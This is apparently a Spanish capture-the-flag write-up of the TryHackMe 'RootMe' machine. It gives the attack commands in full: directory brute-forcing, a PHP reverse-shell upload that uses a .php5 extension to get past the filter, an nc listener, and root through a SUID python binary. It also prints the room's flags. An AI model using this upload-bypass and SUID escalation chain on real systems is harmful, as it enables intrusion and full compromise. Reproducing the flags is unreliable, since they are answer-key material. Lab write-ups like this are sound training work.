# Rrootme by Javier 'Glyaxz' Garcia

IP = 10.10.209.255

# Escaneando la maquina hemos encontrado que tiene abiertos los siguientes puertos

nmap -sC -sV -oN nmap.txt 10.10.209.255

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

# A la hora de checkear la pagina encontramos que en la pagina principal. Usaremos GoBuster para buscar otras carpetas.

gobuster -u 10.10.209.255 -w /usr/share/wordlist/webdir/directory-list-lowercase-2.3-medium.txt

# Directorios encontrados:

/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)

# Dentro de panel podemos subir fotos, usaremos un Reverse Shell.
# Usaremos el PHP_reverse_shell de pentest monkey.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

# Cambiaremos el nombre del fichero por shell.php5 y lo subiremos al panel.
# Con el subido, vamos a dirigirnos a /uploads donde tendria que estar

# Vamos a crear un Listener con NC en el puerto 4444
nc -lvnp 4444

# Con el Listener creado, vamos a abrir el fichero subido de /uploads
# Este nos habrá creado una shell en NC

# Vamos a abrir una bash nueva usando python
python -c 'import pty;pty.spawn("/bin/bash")'

# Buscaremos dentro de las carpetas que pueda ver www-data y encontraremos un fichero llamado user.txt en /var/www
# Lo abriremos usando cat y nos encontraremos la primera flag

THM{y0u_g0t_a_sh3ll}

# Nos pide que busquemos algun fichero extraño que tenga permiso /4000 para el root

find / -user root -perm /4000

# Dentro de la lista, encontraremos Python, el cual no es muy logico que esté ahi.

/usr/bin/python

# Podemos aprovecharnos de que python puede ser usada por los usuarios normales y tiene permisos de root. Usaremos el siguiente codigo

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# A la hora de preguntar a la maquina quienes somos, nos devolverá que somos root.
# Si buscamos dentro de la carpeta /root encontraremos un fichero llamado root.txt
THM{pr1v1l3g3_3sc4l4t10n}